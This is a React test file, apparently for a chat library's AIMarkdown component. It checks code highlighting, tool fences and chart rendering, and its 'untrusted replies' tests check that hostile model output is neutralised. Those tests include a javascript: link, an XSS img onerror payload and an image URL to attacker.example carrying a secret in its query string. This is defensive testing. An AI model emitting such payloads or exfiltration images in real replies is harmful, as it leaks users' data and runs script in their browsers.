import React from 'react';
import { render, screen } from '@testing-library/react';

import { AIMarkdown } from '..';
import { axe } from '../../../../axe-helper';

describe('AIMarkdown', () => {
  it('renders inline code without the highlighter', () => {
    const { container } = render(<AIMarkdown>{'run `yarn build` now'}</AIMarkdown>);
    expect(container.querySelector('code[data-inline="true"]')).toHaveTextContent(
      'yarn build',
    );
    expect(container.querySelector('.str-chat__ai-syntax-highlighter-pre')).toBeNull();
  });

  it('marks a fenced block without a language as block code', () => {
    const { container } = render(<AIMarkdown>{'```\nplain text\n```'}</AIMarkdown>);
    const code = container.querySelector('pre > code');
    expect(code).toHaveTextContent('plain text');
    expect(code).toHaveAttribute('data-inline', 'false');
    expect(container.querySelector('[data-inline="true"]')).toBeNull();
  });

  it.each([
    ['inline code', 'run `yarn build` now'],
    ['a fenced block without a language', '```\nplain\n```'],
    ['a fenced block with a language', '```ts\nconst a = 1;\n```'],
  ])('does not leak the react-markdown node prop to the DOM for %s', (_, markdown) => {
    const { container } = render(<AIMarkdown>{markdown}</AIMarkdown>);
    expect(container.querySelector('code')).toBeInTheDocument();
    expect(container.querySelector('[node]')).toBeNull();
  });

  it('renders fenced code through the highlighter', () => {
    const { container } = render(<AIMarkdown>{'```ts\nconst a = 1;\n```'}</AIMarkdown>);
    expect(
      container.querySelector('.str-chat__ai-syntax-highlighter-pre'),
    ).toBeInTheDocument();
  });

  it('routes a registered tool fence to its component', () => {
    const Weather = ({ data }: { data: string }) => (
      <div data-testid='weather'>{data}</div>
    );
    render(
      <AIMarkdown toolComponents={{ weather: Weather }}>
        {'```weather\n{"c":21}\n```'}
      </AIMarkdown>,
    );
    expect(screen.getByTestId('weather')).toHaveTextContent('{"c":21}');
  });

  it('shows the chart fallback while the chart chunk loads', () => {
    render(<AIMarkdown>{'```chartjs\n{}\n```'}</AIMarkdown>);
    expect(screen.getByText('Loading chart...')).toBeInTheDocument();
  });

  it('renders a plain json fence as highlighted code, not as a chart', () => {
    const { container } = render(
      <AIMarkdown>{'```json\n{ "status": "ok", "items": [1, 2] }\n```'}</AIMarkdown>,
    );
    expect(screen.queryByText('Loading chart...')).toBeNull();
    expect(
      container.querySelector('.str-chat__ai-syntax-highlighter-pre'),
    ).toHaveTextContent('"status"');
  });

  it('renders a json fence that holds a Chart.js config as a chart', () => {
    const chartConfig = JSON.stringify({
      data: { datasets: [{ data: [1, 2, 3] }], labels: ['a', 'b', 'c'] },
      type: 'bar',
    });
    render(<AIMarkdown>{`\`\`\`json\n${chartConfig}\n\`\`\``}</AIMarkdown>);
    expect(screen.getByText('Loading chart...')).toBeInTheDocument();
  });

  it('has no a11y violations', async () => {
    const { container } = render(<AIMarkdown>{'# Title\n\n- a\n- b'}</AIMarkdown>);
    expect(await axe(container)).toHaveNoViolations();
  });
});

describe('AIMarkdown with untrusted replies', () => {
  it('opens web links in a new tab without the referrer', () => {
    render(<AIMarkdown>{'See [the docs](https://example.com/docs).'}</AIMarkdown>);
    const link = screen.getByRole('link', { name: 'the docs' });
    expect(link).toHaveAttribute('href', 'https://example.com/docs');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link).toHaveAttribute('rel', 'nofollow noreferrer noopener');
  });

  it('shows a script link as its text', () => {
    const { container } = render(
      <AIMarkdown>{'[click me](javascript:alert(1))'}</AIMarkdown>,
    );
    expect(container.querySelector('a')).toBeNull();
    expect(container).toHaveTextContent('click me');
  });

  it('shows an image as a link to it unless images are allowed', () => {
    const reply = '![chart](https://attacker.example/pixel.png?secret=1)';
    const { container, rerender } = render(<AIMarkdown>{reply}</AIMarkdown>);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link')).toHaveAttribute(
      'href',
      'https://attacker.example/pixel.png?secret=1',
    );

    rerender(<AIMarkdown allowImages>{reply}</AIMarkdown>);
    expect(container.querySelector('img')).toHaveAttribute(
      'src',
      'https://attacker.example/pixel.png?secret=1',
    );
  });

  it('shows raw HTML as text, not as elements', () => {
    const { container } = render(
      <AIMarkdown>
        {'<img src="https://attacker.example/x.png" onerror="alert(1)">'}
      </AIMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
  });

  it('renders the Markdown again once the text that tripped a renderer changes', () => {
    const consoleError = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const Fragile = ({ children }: { children?: React.ReactNode }) => {
      if (String(children).includes('half')) throw new Error('not written yet');
      return <strong>{children}</strong>;
    };
    const { container, rerender } = render(
      <AIMarkdown markdownComponents={{ strong: Fragile }}>{'**half**'}</AIMarkdown>,
    );
    expect(container.querySelector('strong')).toBeNull();
    expect(container).toHaveTextContent('**half**');

    rerender(
      <AIMarkdown markdownComponents={{ strong: Fragile }}>{'**whole**'}</AIMarkdown>,
    );
    expect(container.querySelector('strong')).toHaveTextContent('whole');
    consoleError.mockRestore();
  });

  it('shows the reply as text when a custom renderer throws', () => {
    const consoleError = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    const Broken = () => {
      throw new Error('broken renderer');
    };
    const { container } = render(
      <AIMarkdown markdownComponents={{ p: Broken }}>{'plain reply'}</AIMarkdown>,
    );
    expect(container).toHaveTextContent('plain reply');
    consoleError.mockRestore();
  });
});
